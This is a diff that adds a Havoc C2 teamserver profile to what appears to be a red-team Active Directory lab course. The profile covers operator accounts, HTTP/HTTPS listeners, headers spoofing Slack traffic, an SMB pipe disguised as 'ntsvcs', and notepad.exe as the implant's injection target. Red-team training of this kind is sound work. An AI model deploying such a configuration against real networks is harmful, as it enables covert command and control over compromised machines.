@@ -31,6 +31,94 @@ Learn how to compromise an Active Directory Infrastructure by simulating adversa
 | Workstation 2       | -             | -            | 1 GB    | 15 GB       | Mandatory      | 3                     | -                 |
 
 ## Chapter 1: Intro to C2
+### C2 Malleable Profile
+```
+Teamserver {
+	Host = "0.0.0.0"
+	Port = 40056
+
+	Build {
+	    Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+	    Nasm = "/usr/bin/nasm"
+	}
+}
+
+WebHook {
+    Discord {
+        # WEBHOOK TOKEN HERE
+        Url = ""
+
+        AvatarUrl = "https://raw.githubusercontent.com/HavocFramework/Havoc/main/Assets/Havoc.png"
+
+        User = "Havoc"
+    }
+}
+
+Operators {
+	user "5pider" {
+		Password = "password"
+	}
+
+	user "havoc" {
+		Password = "password"
+	}
+}
+
+Listeners {
+    Http {
+        Name         = "HTTP"
+        Hosts        = [
+            "192.168.231.131", # CHANGE TO TEAM SERVER IP
+        ]
+        HostBind     = "192.168.231.131" # CHANGE TO TEAM SERVER IP
+        HostRotation = "round-robin"
+        Port         = 80
+        Secure       = false
+        UserAgent    = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
+
+        Headers = [
+            "Host: msdevchat.slack.com",
+            "X-Via: haproxy-www-w6k7",
+            "X-Slack-Req-Id: 6319165c-f976-4d0666532",
+            "X-Slack-Backend: h",
+        ]
+    }
+
+    Http {
+        Name         = "HTTPS"
+        Hosts        = [
+            "192.168.231.129", # CHANGE TO REDIRECTOR IP
+        ]
+        HostBind     = "0.0.0.0" # DO NOT CHANGE
+        HostRotation = "round-robin"
+        Port         = 443
+        Secure       = true
+        UserAgent    = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
+
+        Headers = [
+            "Host: msdevchat.slack.com",
+            "X-Via: haproxy-www-w6k7",
+            "X-Slack-Req-Id: 6319165c-f976-4d0666532",
+            "X-Slack-Backend: h",
+        ]
+    }
+
+    Smb {
+        Name     = "SMB"
+        PipeName = "ntsvcs"
+    }
+}
+
+Demon {
+    Sleep = 5
+
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
+    }
+}
+```
+
 ### C2 Infrastructure Design
 ![](./assets/c2_infrastructure.png)
 
